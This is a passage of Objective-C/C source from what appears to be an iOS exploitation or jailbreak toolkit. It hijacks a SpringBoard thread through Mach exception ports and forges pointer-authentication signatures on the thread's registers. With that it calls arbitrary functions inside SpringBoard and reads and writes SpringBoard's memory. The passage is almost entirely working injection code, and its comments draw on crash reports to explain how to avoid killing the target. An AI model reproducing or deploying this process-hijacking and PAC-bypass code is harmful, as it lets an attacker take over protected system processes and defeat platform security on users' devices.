    }

    ExceptionMessage exc;
    if (!wait_exception(g_RC_firstExceptionPort, &exc, newTimeout, false)) {
        RC_DIAG("temp/%s wait1 MISS timeout=%d (missed creator 0x101 → likely SIGBUS 0x201)",
                name ?: "?", newTimeout);
        g_RC_lastTempStep = 1;
        g_RC_success = false;
        return 0;
    }
    RC_DIAG("temp/%s wait1 PC=0x%llx LR=0x%llx (expect 0x101 if post-creator)",
            name ?: "?",
            (unsigned long long)native_strip(exc.threadState.__pc),
            (unsigned long long)native_strip(exc.threadState.__lr));

    // Never reply onto a state that isn't a live faulted thread. Replying with
    // a real function pointer + FAKE_LR onto a bogus state resumes a thread
    // with sp=0 and gets the *target process* SIGKILLed
    // (SpringBoard IPS 2026-09-26 06:21:04, CODESIGNING "Invalid Page").
    if (!exception_state_is_sane(&exc)) {
        RC_DIAG("temp/%s wait1 REJECT non-live state (pc=0x%llx sp=0x%llx flavor=%u) — not replying",
                name ?: "?",
                (unsigned long long)native_strip(exc.threadState.__pc),
                (unsigned long long)native_strip(exc.threadState.__sp),
                (unsigned)exc.flavor);
        g_RC_lastTempStep = 3;
        g_RC_success = false;
        return 0;
    }

    exc.threadState.__x[0] = x0;
    exc.threadState.__x[1] = x1;
    exc.threadState.__x[2] = x2;
    exc.threadState.__x[3] = x3;
    exc.threadState.__x[4] = x4;
    exc.threadState.__x[5] = x5;
    exc.threadState.__x[6] = x6;
    exc.threadState.__x[7] = x7;
    if (!sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN_CREATOR)) {
        RC_DIAG("sign_state failed in temp_internal, no reply sent (name=%s)", name ? name : "?");
        g_RC_lastTempStep = 4;
        g_RC_success = false;
        return 0;
    }
    reply_with_state(&exc, &exc.threadState);

    if (timeout < 0) {
        printf("[%s:%d] Trojan thread cleanup\n", __FUNCTION__, __LINE__);
        return 0;
    }

    ExceptionMessage exc2;
    if (!wait_exception(g_RC_firstExceptionPort, &exc2, newTimeout, false)) {
        RC_DIAG("temp/%s wait2 MISS (RET to FAKE_LR 0x201 uncaught?)", name ?: "?");
        g_RC_lastTempStep = 2;
        g_RC_success = false;
        return 0;
    }
    RC_DIAG("temp/%s wait2 PC=0x%llx LR=0x%llx ret=0x%llx",
            name ?: "?",
            (unsigned long long)native_strip(exc2.threadState.__pc),
            (unsigned long long)native_strip(exc2.threadState.__lr),
            (unsigned long long)exc2.threadState.__x[0]);
    g_RC_lastTempRetPC_raw = exc2.threadState.__pc;
    g_RC_lastTempRetPC = native_strip(exc2.threadState.__pc);
    g_RC_lastTempExcType = exc2.exception;
    g_RC_lastTempExcCode = exc2.codeFirst;
    g_RC_lastTempX0 = exc2.threadState.__x[0];
    uint64_t retValue = exc2.threadState.__x[0];
    // A return is the thread executing the instruction it returned to. Anything else
    // on the second wait is a fault raised inside the function.
    //
    // The two need different replies, and this was the same reply for both, which is
    // how one fault used to poison a thread for the rest of the session.
    //
    // Replying with the exception's own state resumes the thread at the instruction
    // that just faulted. It faults again, for the same reason, with the same
    // registers, and that arrives on the port the next call reads. Every call after
    // it therefore reports the identical fault with the identical return value, and
    // the one that actually happened is indistinguishable from the ones it caused.
    //
    // It is visible in a measured console: pthread_create_suspended_np faulting once
    // at a shared cache address, and every later number on that thread being the same
    // fault at the same address with the same x0, which is not what a thread that has
    // run since would look like. x0 was 0x10 on every attempt, which is a loop
    // constant, and no argument to that call was ever 0x10.
    //
    // So a fault parks the thread at the fake program counter instead. It is a known
    // trap address that the next call's first wait is designed to consume, and the
    // fault is reported once, by the one check that exists, instead of being
    // re-raised forever.
    if (native_strip(exc2.threadState.__pc) == FAKE_LR_TROJAN_CREATOR) {
        reply_with_state(&exc2, &exc2.threadState);
    } else {
        arm_thread_state64_internal park = exc2.threadState;
        if (sign_state(g_RC_trojanThreadAddr, &park,
                       FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR)) {
            RC_DIAG("temp/%s faulted at 0x%llx (not the fake LR) — parked at 0x%llx",
                    name ?: "?", (unsigned long long)native_strip(exc2.threadState.__pc),
                    (unsigned long long)FAKE_PC_TROJAN_CREATOR);
            reply_with_state(&exc2, &park);
        } else {
            // No signature, so no state worth replying with. Handing back the
            // faulting state would resume the loop, so the thread is left stopped on
            // the exception instead, which strands it but breaks the loop, and the
            // next call will fail loudly rather than repeating a stale fault.
            RC_DIAG("temp/%s faulted at 0x%llx and the park could not be signed — "
                    "leaving it stopped", name ?: "?",
                    (unsigned long long)native_strip(exc2.threadState.__pc));
        }
    }
    if (remote_call_should_log_result(name, false))
        printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name, retValue, retValue);

    // The "if getpid returned 0, fail" rule that used to be here is gone, and
    // only the g_RC_success assignment is gone: the printf stays, because a zero
    // from getpid is worth seeing.
    //
    // A value cannot tell a call that did not happen from a call that happened and
    // returned zero, and this function can already tell the difference, precisely
    // and without a guess. Reaching this line at all means both waits completed.
    // The first one means the thread was parked at a faulting PC and took the trap.
    // The second means it ran the function and took the trap on the way out. A
    // caller that wants to know whether the mechanism worked reads the step, and a
    // caller that wants to know whether it happened reads whether it got here.
    //
    // What the rule cost is not a failed init, it is a destroyed one. Together with
    // the bootstrap's own "bootstrapPid != 0", it made the entire overlay depend on
    // a number that the bootstrap then throws away and re-reads properly further
    // down, and a session that measured attempts=3, last=unclassified,
    // pacTimeouts=0 was exactly that: no wait gave up, the pacia signer was never
    // late, the call went out and came back with zero, and every part of the engine
    // was working. Both waits completing is the proof of life. A non-zero pid is
    // not, and it is not even a fact about the engine.
    if (strcmp(name, "getpid") == 0 && retValue == 0) {
        printf("[%s:%d] getpid returned 0 (both waits completed, so the call ran)\n",
               __FUNCTION__, __LINE__);
    }
    return retValue;
}

uint64_t do_remote_call_stable(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    uint64_t _ipcWait = 0;
    const uint64_t _ipcT1 = rc_ipc_lock_measuring(&_ipcWait);
    (void)_ipcWait;
    uint64_t res = 0;
    if (g_RC_vphoneBridge) {
        if (timeout >= 0)
            res = rc_vphone_bridge_call(2, 0, name, x0, x1, x2, x3, x4, x5, x6, x7);
        rc_ipc_unlock_measuring(_ipcT1, name);
        return res;
    }

    if (!g_RC_creatingExtraThread) {
        res = do_remote_call_temp_internal(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
        rc_ipc_unlock_measuring(_ipcT1, name);
        return res;
    }

    // MUST strip PAC bits from local dlsym before remote_pac re-signs for the
    // target thread. Leaving a locally-signed pointer here makes remote_pac
    // produce a bad LR/PC; SpringBoard then RET to raw FAKE_LR 0x401 without
    // our exception port catching it → SIGBUS 0x401 (seen in IPS).
    uint64_t pcAddr = native_strip((uint64_t)dlsym(RTLD_DEFAULT, name));
    if (!pcAddr) {
        printf("[%s:%d] Unable to find symbol: %s\n", __FUNCTION__, __LINE__, name);
        g_RC_success = false;
        rc_ipc_unlock_measuring(_ipcT1, name);
        return 0;
    }
    res = do_remote_call_stable_addr_internal(timeout, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
    rc_ipc_unlock_measuring(_ipcT1, name);
    return res;
}

uint64_t do_remote_call_stable_addr(int timeout, uint64_t pcAddr, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    uint64_t _ipcWait = 0;
    const uint64_t _ipcT1 = rc_ipc_lock_measuring(&_ipcWait);
    (void)_ipcWait;
    uint64_t res = do_remote_call_stable_addr_internal(timeout, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
    rc_ipc_unlock_measuring(_ipcT1, name);
    return res;
}

uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    if (g_RC_vphoneBridge) {
        if (timeout < 0) return 0;
        if (rc_vphone_bridge_unsafe_addr_call_name(name)) {
            printf("[VPHONE-BRIDGE] blocked unsafe addr-call name=%s addr=%#llx\n",
                   name ?: "(null)", pcAddr);
            g_RC_success = false;
            return 0;
        }
        return rc_vphone_bridge_call(3, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
    }

    if (!g_RC_creatingExtraThread)
        return 0;

    if (!pcAddr) {
        printf("[%s:%d] NULL function pointer: %s\n", __FUNCTION__, __LINE__, name ?: "(addr-call)");
        g_RC_success = false;
        return 0;
    }
    // Addr-call sites may pass a still-signed pointer; strip before re-sign.
    pcAddr = native_strip(pcAddr);
    int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
    int newTimeout = (floorTimeout > timeout) ? floorTimeout : timeout;

    g_rcW1Sender = 0;
    g_rcW1Pc = 0;

    ExceptionMessage exc;
    RC_DIAG("stable/%s wait1 begin timeout=%d", name ?: "(addr-call)", newTimeout);
    const uint64_t tW1 = remote_call_diag_now_us();
    const bool got1 = wait_exception(g_RC_secondExceptionPort, &exc, newTimeout, false);
    g_rcWait1US += remote_call_diag_now_us() - tW1;
    if (remote_call_diag_now_us() - tW1 > g_rcWait1MaxUS) {
        g_rcWait1MaxUS = remote_call_diag_now_us() - tW1;
    }
    if (!got1) {
        g_rcWait1TO++;
        RC_DIAG("stable/%s wait1 TIMEOUT (new thread didn't hit 0x301 park?)", name ?: "(addr-call)");
        printf("[%s:%d] Don't receive first exception on new thread\n", __FUNCTION__, __LINE__);
        g_RC_lastTempStep = 20;
        g_RC_success = false;
        return 0;
    }
    RC_DIAG("stable/%s wait1 caught PC=0x%llx LR=0x%llx (expect 0x301)",
            name ?: "(addr-call)",
            (unsigned long long)native_strip(exc.threadState.__pc),
            (unsigned long long)native_strip(exc.threadState.__lr));
    // Who replied to, and who is it that then faulted. If a fault arriving on
    // the first port carries the same sender as this park message, the thread
    // that took the call is the one that crashed, and the exception port it
    // faults to is not the one the call waits on. If the senders differ, the
    // crash belongs to a different injected thread entirely.
    g_rcW1Sender = exc.Head.msgh_remote_port;
    g_rcW1Pc = native_strip(exc.threadState.__pc);

    // This is the guard that saved SpringBoard on 2026-09-26: the port handed us
    // an all-zero state, and we used to sign pc=<real fn>/lr=0x401 onto it and
    // reply. getpid then ran (leaf, no stack needed) and RET 0x401 aborted the
    // process with SIGKILL / CODESIGNING "Invalid Page". A zeroed state is never
    // the parked 0x301 thread — drop the session instead of replying.
    if (!exception_state_is_sane(&exc)) {
        RC_DIAG("stable/%s wait1 REJECT non-live state (pc=0x%llx sp=0x%llx flavor=%u) — not replying",
                name ?: "(addr-call)",
                (unsigned long long)native_strip(exc.threadState.__pc),
                (unsigned long long)native_strip(exc.threadState.__sp),
                (unsigned)exc.flavor);
        g_RC_lastTempStep = 3;
        g_RC_success = false;
        return 0;
    }

    exc.threadState.__x[0] = x0;
    exc.threadState.__x[1] = x1;
    exc.threadState.__x[2] = x2;
    exc.threadState.__x[3] = x3;
    exc.threadState.__x[4] = x4;
    exc.threadState.__x[5] = x5;
    exc.threadState.__x[6] = x6;
    exc.threadState.__x[7] = x7;
    // Cyanide/Fl0rk: ALWAYS sign with trojanThreadAddr (PAC gadget context),
    // even though the exception arrives on the synthetic call thread.
    // Signing with callThreadAddr produced uncatchable RET→0x401 SIGBUS.
    if (!sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN)) {
        // No reply. The target's thread stays parked in the exception and
        // nothing bogus is ever written into its PC, and the caller is told the
        // session is finished so it re-initialises instead of pushing another
        // call through a wedged thread.
        RC_DIAG("sign_state failed, abandoning without a reply (name=%s)", name ? name : "?");
        g_RC_lastTempStep = 19;
        g_RC_success = false;
        pthread_mutex_unlock(&g_universal_ipc_mutex);
        return 0;
    }
    reply_with_state(&exc, &exc.threadState);

    if (timeout < 0) {
        printf("[%s:%d] Trojan thread cleanup\n", __FUNCTION__, __LINE__);
        return 0;
    }

    ExceptionMessage exc2;
    RC_DIAG("stable/%s wait2 begin", name ?: "(addr-call)");
    const uint64_t tW2 = remote_call_diag_now_us();
    const bool got2 = wait_exception(g_RC_secondExceptionPort, &exc2, newTimeout, false);
    const uint64_t w2 = remote_call_diag_now_us() - tW2;
    g_rcWait2US += w2;
    if (w2 > g_rcWait2MaxUS) g_rcWait2MaxUS = w2;
    if (!got2) {
        g_rcWait2TO++;
        RC_DIAG("stable/%s wait2 TIMEOUT", name ?: "(addr-call)");
        printf("[%s:%d] Don't receive second exception on new thread (name=%s) — repark\n",
               __FUNCTION__, __LINE__, name ?: "(addr-call)");
        // What is known for certain here: the call thread took the work, was
        // replied to, and never came back. Both messages this line reports were
        // genuinely received on the second port, so reading them costs nothing
        // and destroys nothing.
        //
        // What used to be here, and why it is gone: a probe of the first port to
        // see whether a message from some other thread had piled up on it. That
        // probe found the cause, EXC_BAD_ACCESS on a port with no consumer, and
        // init now hands those threads back, so the port should have no traffic
        // at all. Probing it again is not possible without a primitive that
        // does not link: mach_msg_peek is not exported by libSystem on iOS, and
        // receiving-then-resending trades a clean failure for one where a
        // failed re-send loses the message and strands the thread. borrowed
        // says how many threads init gave back, so a nonzero count here means
        // the release did not take.
        g_RC_lastTempStep = 21;
        g_RC_lastTempRetPC_raw = 0;
        g_RC_lastTempRetPC = 0;
        g_RC_lastTempExcType = 0;
        g_RC_lastTempExcCode = 0;
        g_RC_lastTempX0 = 0;
        g_rcW2Stray = g_rcBorrowedReleased ? 1 : 2;
        NSLog(@"[RC-W2TO] %s: no return, call pc=0x%llx w1snd=0x%x w1pc=0x%llx "
              @"borrowed=%llu released=%llu kept=%llu",
              name ?: "?", (unsigned long long)pcAddr,
              (unsigned)g_rcW1Sender, (unsigned long long)g_rcW1Pc,
              (unsigned long long)g_rcBorrowedTotal,
              (unsigned long long)g_rcBorrowedReleased,
              (unsigned long long)g_rcBorrowedKept);
        // Best-effort: thread may be wedged at FAKE_LR. Mark failed; caller must
        // abandon/reinit. Leaving success=false prevents further publishes.
        g_RC_success = false;
        return 0;
    }
    uint64_t retValue = exc2.threadState.__x[0];
    RC_DIAG("stable/%s wait2 caught PC=0x%llx LR=0x%llx ret=0x%llx",
            name ?: "(addr-call)",
            (unsigned long long)native_strip(exc2.threadState.__pc),
            (unsigned long long)native_strip(exc2.threadState.__lr),
            (unsigned long long)retValue);
    // Recorded here as well, and for the reason the temp path records it. The
    // report prints a program counter, an exception type and x0, and on this path
    // all three were carried over from whichever temp call ran last. So a failure
    // of the very first stable call was being described in terms of a fault that
    // had already been dealt with, and a reader had no way to know that.
    g_RC_lastTempRetPC_raw = exc2.threadState.__pc;
    g_RC_lastTempRetPC = native_strip(exc2.threadState.__pc);
    g_RC_lastTempExcType = exc2.exception;
    g_RC_lastTempExcCode = exc2.codeFirst;
    g_RC_lastTempX0 = exc2.threadState.__x[0];
    // Re-park: reply keeps thread blocked in exception until next hijack.
    reply_with_state(&exc2, &exc2.threadState);
    if (remote_call_should_log_result(name, true))
        printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name ?: "(addr-call)", retValue, retValue);
    return retValue;
}

bool restore_trojan_thread(arm_thread_state64_internal *state)
{
    ExceptionMessage exc;
    int restoreTimeoutMS = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 20000;
    if (restoreTimeoutMS < 1000) restoreTimeoutMS = 1000;
    RC_DIAG("restore_trojan_thread waiting firstExceptionPort timeout=%dms", restoreTimeoutMS);
    if (!wait_exception(g_RC_firstExceptionPort, &exc, restoreTimeoutMS, false)) {
        RC_DIAG("restore_trojan_thread wait TIMEOUT %dms", restoreTimeoutMS);
        printf("[%s:%d] Failed to receive exception while restoring within %dms\n",
               __FUNCTION__, __LINE__, restoreTimeoutMS);
        return false;
    }

    RC_DIAG("restore_trojan_thread caught excPC=0x%llx excLR=0x%llx — restoring original PC=0x%llx LR=0x%llx",
            (unsigned long long)native_strip(exc.threadState.__pc),
            (unsigned long long)native_strip(exc.threadState.__lr),
            (unsigned long long)native_strip(state->__pc),
            (unsigned long long)native_strip(state->__lr));
    state->__flags = exc.threadState.__flags;
    if (!sign_state(g_RC_trojanThreadAddr, state, state->__pc, state->__lr)) {
        // This is the state that puts the target's ORIGINAL thread back on its
        // own feet. Failing to sign it and replying anyway would resume
        // SpringBoard's hijacked thread at an unsigned PC, which is the failure
        // that produced uncatchable crashes rather than a recoverable one.
        RC_DIAG("restore_trojan_thread: sign_state failed, NOT resuming the original thread");
        g_RC_success = false;
        return false;
    }
    reply_with_state(&exc, state);
    RC_DIAG("restore_trojan_thread reply sent — original thread resumed");
    return true;
}

void abandon_remote_call(void) {
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    abandon_remote_call_internal();
    pthread_mutex_unlock(&g_universal_ipc_mutex);
}

// After creator reply parks the hijacked thread at FAKE_PC 0x101, any fail
// path MUST restore original state before tearing local ports down. Calling
// abandon alone leaves SpringBoard (often main) stuck at 0x101 → WATCHDOG.
static void fail_after_creator_park(RemoteCallInitFailure why, int targetPid)
{
    remote_call_note_init_failure(why, targetPid);
    if (g_RC_trojanThreadAddr && g_RC_firstExceptionPort) {
        if (!restore_trojan_thread(&g_RC_originalState)) {
            printf("[%s:%d] restore after FAKE_PC park failed — SB may WATCHDOG\n",
                   __FUNCTION__, __LINE__);
        }
    }
    // abandon_remote_call takes the IPC mutex; init_remote_call does not hold it here.
    abandon_remote_call();
}

void abandon_remote_call_internal(void) {
    if (g_RC_vphoneBridge) {
        g_RC_vphoneBridge = false;
        g_RC_success = false;
        g_RC_pid = 0;
        g_RC_threadList = [NSMutableArray new];
        return;
    }

    // Skip every SB-side IPC. Caller has decided that the remote task is dead
    // (typically SpringBoard finished a respawn). Touching the dead trojan
    // would hang for the call timeout. Local resources still need releasing.
    destroy_exception_port(g_RC_firstExceptionPort);
    // Same rule as destroy_remote_call: the synthetic call thread is parked on
    // this port with a signed LR of 0x401, and nothing here confirms it stopped.
    // Leaving the port installed means a late fault is caught instead of fatal.
    // The port dies with the target on a respawn and the reaper collects it.
    if (!g_RC_creatingExtraThread) {
        destroy_exception_port(g_RC_secondExceptionPort);
    }
    if (g_RC_dummyThread) pthread_cancel(g_RC_dummyThread);
    if (MACH_PORT_VALID(g_RC_dummyThreadMach)) {
        mach_port_deallocate(mach_task_self_, g_RC_dummyThreadMach);
    }
    clear_remote_shmem_cache();
    (void)reap_dead_port_names("abandon_remote_call");
    g_RC_taskAddr = 0;
    g_RC_firstExceptionPort = MACH_PORT_NULL;
    g_RC_secondExceptionPort = MACH_PORT_NULL;
    g_RC_firstExceptionPortAddr = 0;
    g_RC_secondExceptionPortAddr = 0;
    g_RC_dummyThread = NULL;
    g_RC_dummyThreadMach = MACH_PORT_NULL;
    g_RC_dummyThreadAddr = 0;
    g_RC_dummyThreadTro = 0;
    g_RC_selfThreadAddr = 0;
    g_RC_selfThreadCtid = 0;
    g_RC_vmMap = 0;
    g_RC_callThreadAddr = 0;
    g_RC_trojanThreadAddr = 0;
    // The cached PAC keys belong to that thread. Clearing the thread address
    // without the keys would leave the next session signing with the previous
    // occupant's key pair, which produces signatures that authenticate nothing.
    pac_release_key_cache();
    g_RC_pid = 0;
    g_RC_success = false;
    g_RC_creatingExtraThread = false;
    g_RC_vphoneBridge = false;
    g_RC_trojanMem = 0;
    g_RC_threadList = [NSMutableArray new];
}

int destroy_remote_call(void) {
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    int res = destroy_remote_call_internal();
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return res;
}

int destroy_remote_call_internal(void) {
    if (g_RC_vphoneBridge) {
        g_RC_vphoneBridge = false;
        g_RC_pid = 0;
        g_RC_success = false;
        g_RC_threadList = [NSMutableArray new];
        return 0;
    }

    if (!remote_call_has_local_state()) {
        clear_remote_shmem_cache();
        (void)reap_dead_port_names("destroy_remote_call");
        g_RC_success = false;
        g_RC_threadList = [NSMutableArray new];
        return 0;
    }

    if (g_RC_trojanMem) {
        do_remote_call_stable(100, "munmap", g_RC_trojanMem, PAGE_SIZE, 0, 0, 0, 0, 0, 0);
        g_RC_trojanMem = 0;
    }
    // The synthetic call thread is the one thing in this file that must never
    // be left runnable while its catcher is gone.
    //
    // do_remote_call_stable(-1, "pthread_exit", ...) is a full remote call: it
    // catches the parked exception, signs pc=pthread_exit and lr=FAKE_LR_TROJAN
    // onto the state, and replies. The thread then runs, and its LR is 0x401.
    // The -1 timeout takes the early return at the top of the call, so we do
    // not wait for it to finish and we never learn whether it did.
    //
    // The next two lines then destroyed the exception port. If the thread was
    // still inside pthread_exit, or if it returned, it did a RET to 0x401 with
    // nothing installed to catch it. 0x401 is not in any mapped region, so the
    // thread took EXC_BAD_ACCESS and the whole process died. That is not a
    // theory, it is the 2026-09-29 06:39 SpringBoard report: SIGBUS,
    // EXC_BAD_ACCESS, pc = lr = 0x401, "0x401 is not in any region", faulting
    // thread in thread_start. It also explains why the crash is intermittent
    // and why a heavy frame makes it more likely: the teardown only runs after
    // a session failure, and slow calls are what cause session failures.
    //
    // So the port stays installed. If that thread ever does resume, its fault
    // is caught instead of fatal, and the port becomes a dead name the reaper
    // collects. Leaking a port is recoverable; a SIGBUS in SpringBoard is not.
    bool callThreadMayStillBeRunning = false;
    if (g_RC_creatingExtraThread) {
        // Only wake the thread at all if the session still looks healthy. A
        // session that has already failed is the common case here, and issuing
        // a remote call on it is issuing a call whose reply nobody can trust.
        if (g_RC_success) {
            do_remote_call_stable(-1, "pthread_exit", 0, 0, 0, 0, 0, 0, 0, 0);
        }
        callThreadMayStillBeRunning = true;
    }
    else {
        // This branch resumes the target's ORIGINAL thread on its own PC and
        // LR, which is the state it was running before we touched it. That is
        // ordinary code and its port is ours to close.
        restore_trojan_thread(&g_RC_originalState);
    }

    destroy_exception_port(g_RC_firstExceptionPort);
    if (!callThreadMayStillBeRunning) {
        destroy_exception_port(g_RC_secondExceptionPort);
    }
    if (g_RC_dummyThread) pthread_cancel(g_RC_dummyThread);
    if (MACH_PORT_VALID(g_RC_dummyThreadMach)) {
        mach_port_deallocate(mach_task_self_, g_RC_dummyThreadMach);
    }
    clear_remote_shmem_cache();
    (void)reap_dead_port_names("destroy_remote_call");
    g_RC_taskAddr = 0;
    g_RC_firstExceptionPort = MACH_PORT_NULL;
    g_RC_secondExceptionPort = MACH_PORT_NULL;
    g_RC_firstExceptionPortAddr = 0;
    g_RC_secondExceptionPortAddr = 0;
    g_RC_dummyThread = NULL;
    g_RC_dummyThreadMach = MACH_PORT_NULL;
    g_RC_dummyThreadAddr = 0;
    g_RC_dummyThreadTro = 0;
    g_RC_selfThreadAddr = 0;
    g_RC_selfThreadCtid = 0;
    g_RC_vmMap = 0;
    g_RC_callThreadAddr = 0;
    g_RC_trojanThreadAddr = 0;
    // The cached PAC keys belong to that thread. Clearing the thread address
    // without the keys would leave the next session signing with the previous
    // occupant's key pair, which produces signatures that authenticate nothing.
    pac_release_key_cache();
    g_RC_pid = 0;
    g_RC_success = false;
    g_RC_creatingExtraThread = false;
    g_RC_vphoneBridge = false;
    g_RC_trojanMem = 0;

    g_RC_threadList = [NSMutableArray new];

    return 0;
}

bool remote_call_has_local_state(void) {
    return g_RC_vphoneBridge ||
           g_RC_taskAddr ||
           MACH_PORT_VALID(g_RC_firstExceptionPort) ||
           MACH_PORT_VALID(g_RC_secondExceptionPort) ||
           g_RC_firstExceptionPortAddr ||
           g_RC_secondExceptionPortAddr ||
           g_RC_dummyThread ||
           MACH_PORT_VALID(g_RC_dummyThreadMach) ||
           g_RC_dummyThreadAddr ||
           g_RC_dummyThreadTro ||
           g_RC_vmMap ||
           g_RC_callThreadAddr ||
           g_RC_trojanThreadAddr ||
           g_RC_pid ||
           g_RC_trojanMem;
}

struct VMShmem *get_shmem_from_cache(uint64_t pageAddr)
{
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (g_RC_shmemCache[i].used && g_RC_shmemCache[i].remoteAddress == pageAddr) {
            g_RC_shmemUseCounter[i] = ++g_RC_shmemClock;
            return &g_RC_shmemCache[i];
        }
    }
    return NULL;
}

struct VMShmem *put_shmem_in_cache(struct VMShmem *shmem)
{
    int slot = -1;
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (!g_RC_shmemCache[i].used) { slot = i; break; }
    }
    if (slot < 0) {
        uint64_t oldest = UINT64_MAX;
        for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
            if (g_RC_shmemUseCounter[i] < oldest) {
                oldest = g_RC_shmemUseCounter[i];
                slot = i;
            }
        }
        if (slot < 0) {
            printf("[%s:%d] g_RC_shmemCache eviction failed\n", __FUNCTION__, __LINE__);
            return NULL;
        }
        release_shmem_slot(slot);
        uint64_t events = ++g_RC_shmemEvictions;
        if (events == 1 || (events % 256) == 0) {
            printf("[RemoteCall] shmem cache LRU evicted slot=%d events=%llu\n",
                   slot, (unsigned long long)events);
        }
    }
    g_RC_shmemCache[slot] = *shmem;
    g_RC_shmemCache[slot].used = true;
    g_RC_shmemUseCounter[slot] = ++g_RC_shmemClock;
    return &g_RC_shmemCache[slot];
}

struct VMShmem *get_shmem_for_page(uint64_t pageAddr)
{
    struct VMShmem *cached = get_shmem_from_cache(pageAddr);
    if (cached) return cached;

    struct VMShmem newShmem = vm_map_remote_page(g_RC_vmMap, pageAddr);
    if (!newShmem.localAddress) {
        static volatile uint64_t shmemRetryEvents = 0;
        uint64_t events = __sync_add_and_fetch(&shmemRetryEvents, 1);
        if (events == 1 || (events % 64) == 0) {
            printf("[RemoteCall] shmem map failed page=0x%llx; clearing cache and retrying event=%llu\n",
                   pageAddr, (unsigned long long)events);
        }
        clear_remote_shmem_cache();
        (void)reap_dead_port_names("shmem_retry");
        newShmem = vm_map_remote_page(g_RC_vmMap, pageAddr);
    }
    if (!newShmem.localAddress)
            return NULL;
    return put_shmem_in_cache(&newShmem);
}

bool remote_read(uint64_t src, void *dst, uint64_t size)
{
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    bool res = remote_read_internal(src, dst, size);
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return res;
}

bool remote_read_internal(uint64_t src, void *dst, uint64_t size)
{
    if (g_RC_vphoneBridge)
        return rc_vphone_bridge_read(src, dst, size);

    if (!src || !dst || !size) return false;
    src = native_strip(src);
    uint64_t dstAddr = (uint64_t)(uintptr_t)dst;
    uint64_t until = src + size;

    while (src < until) {
        uint64_t remaining = until - src;
        uint64_t offs      = src & PAGE_MASK;
        uint64_t roundUp   = (src + PAGE_SIZE) & ~PAGE_MASK;
        uint64_t copyCount = (roundUp - src < remaining) ? (roundUp - src) : remaining;
        uint64_t pageAddr  = src & ~PAGE_MASK;

        struct VMShmem *page = get_shmem_for_page(pageAddr);
        if (!page) {
            // Rate limited for the same reason RC_DIAG is. remote_read is the
            // busiest call in the memory path, so a page that cannot be mapped
            // fails once per read rather than once per frame, and a caller that
            // keeps asking for the same bad address turns this line into the
            // same logd flood RC_DIAG was: an os_log round trip per failure,
            // inside the two global remote-call locks. One line a second still
            // says it is happening and the address it is happening at.
            static uint64_t s_readFailLast = 0;
            static uint64_t s_readFailCount = 0;
            const uint64_t now = remote_call_diag_now_us();
            s_readFailCount++;
            if (s_readFailLast == 0 || now - s_readFailLast >= 1000000ULL) {
                s_readFailLast = now;
                NSLog(@"[RemoteCall] DIAG remote_read FAIL no page for src=0x%llx (x%llu in this second)",
                      (unsigned long long)src, (unsigned long long)s_readFailCount);
                s_readFailCount = 0;
            }
            return false;
        }
        memcpy((void *)(uintptr_t)dstAddr, (void *)(uintptr_t)(page->localAddress + offs), (size_t)copyCount);
        src     += copyCount;
        dstAddr += copyCount;
    }
    return true;
}

uint64_t remote_read64(uint64_t src)
{
    uint64_t val = 0;
    if (!remote_read(src, &val, sizeof(val))) return 0;
    return val;
}

void remote_hexdump(uint64_t remoteAddr, size_t size)
{
    uint8_t *buf = (uint8_t *)malloc(size);
    if (!buf) {
        return;
    }

    if (!remote_read(remoteAddr, buf, size)) {
        printf("[%s:%d] remote_read failed at 0x%llx\n", __FUNCTION__, __LINE__, (unsigned long long)remoteAddr);
        free(buf);
        return;
    }

    char ascii[17];
    ascii[16] = '\0';
    for (size_t i = 0; i < size; ++i) {
        if ((i % 16) == 0)
            printf("[0x%016llx+0x%03zx] ", (unsigned long long)remoteAddr, i);

        printf("%02X ", buf[i]);
        ascii[i % 16] = (buf[i] >= ' ' && buf[i] <= '~') ? buf[i] : '.';

        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) printf(" ");
                for (size_t j = (i + 1) % 16; j < 16; ++j)
                    printf("   ");
                printf("|  %s \n", ascii);
            }
        }
    }

    free(buf);
}

bool remote_write(uint64_t dst, const void *src, uint64_t size)
{
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    bool res = remote_write_internal(dst, src, size);
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return res;
}

